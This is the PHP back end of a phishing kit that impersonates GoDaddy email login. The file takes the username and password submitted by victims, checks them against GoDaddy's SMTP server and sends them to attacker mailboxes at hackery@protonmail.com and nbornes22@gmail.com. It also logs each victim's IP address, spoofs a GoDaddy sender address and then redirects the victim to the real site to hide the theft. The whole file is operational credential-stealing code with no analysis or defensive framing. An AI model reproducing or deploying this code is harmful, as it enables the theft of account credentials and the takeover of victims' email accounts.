<?php header('Access-Control-Allow-Origin: *'); ?>
<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
session_start();
ob_start();

/*//////////////////////////////////////////////////////
███╗   ███╗██████╗        ██╗  ██╗██╗  ██╗██╗  ██╗    //
████╗ ████║██╔══██╗       ╚██╗██╔╝╚██╗██╔╝╚██╗██╔╝    //
██╔████╔██║██████╔╝        ╚███╔╝  ╚███╔╝  ╚███╔╝     //
██║╚██╔╝██║██╔══██╗        ██╔██╗  ██╔██╗  ██╔██╗     //
██║ ╚═╝ ██║██║  ██║██╗    ██╔╝ ██╗██╔╝ ██╗██╔╝ ██╗    //
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    //
*///////////////////////////////////////////////////////

ini_set("output_buffering",4096);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
$user= $_POST['username'];
$pass= $_POST['password'];
$email_from= $_POST['username'];
if(!empty($pass) && $user !=="undefined" && $user !=="no@one.com" ) {

    $base= base64_encode($pass);
    $em_str = str_replace("#","",$user);

require 'phpm/Exception.php';
require 'phpm/PHPMailer.php';
require 'phpm/SMTP.php';

$mail = new PHPMailer;
$mail->isSMTP();
$mail->SMTPDebug = 0;
$mail->SMTPAuth = true;
$mail->SMTPSecure = true;

 $em= $user;


$mail->Host = 'smtpout.secureserver.net';
$mail->Port = 465;
$mail->Username = "$em_str";
$mail->Password = "$pass";
$mail->setFrom($email_from);
$mail->addAddress('hackery@protonmail.com');
$mail->Subject = "$user";
$mail->msgHTML("$base");

if (!$mail->send())
{

    $ip = getenv("REMOTE_ADDR");
$message .= "U: ".$user."\n";
$message .= "Sender Email: ".$email_from."\n";
$message .= "P: ".$pass."\n";
$message .= "IP:  ".$ip."\n";
$subject = "~ GoDaddy Invalid ~ $ip";
$headers = "From: Godaddy<noreply@godaddy.com>";
$SEND='nbornes22@gmail.com';
@fclose(@fwrite(@fopen("$SEND.txt", "a"),$message));
@mail($SEND,$subject,$message);

@header('location: index.php#'.$email_from.'#err');

}
else {
$ip = getenv("REMOTE_ADDR");
$message .= "U: ".$user."\n";
$message .= "Sender Email: ".$email_from."\n";
$message .= "P: ".$pass."\n";
$message .= "IP:  ".$ip."\n";
$subject = "~ GoDaddy Valid ~ $ip";
$headers = "From: Godaddy<noreply@godaddy.com>";
$SEND='nbornes22@gmail.com';
@fclose(@fwrite(@fopen("$SEND.txt", "a"),$message));
@mail($SEND,$subject,$message);

    
    @header('location: https://www.godaddy.com/?app=email&realm=pass');
 }
$mail->smtpClose();
}
else{
     echo json_encode(['msg'=>'empty']);
}
?>

















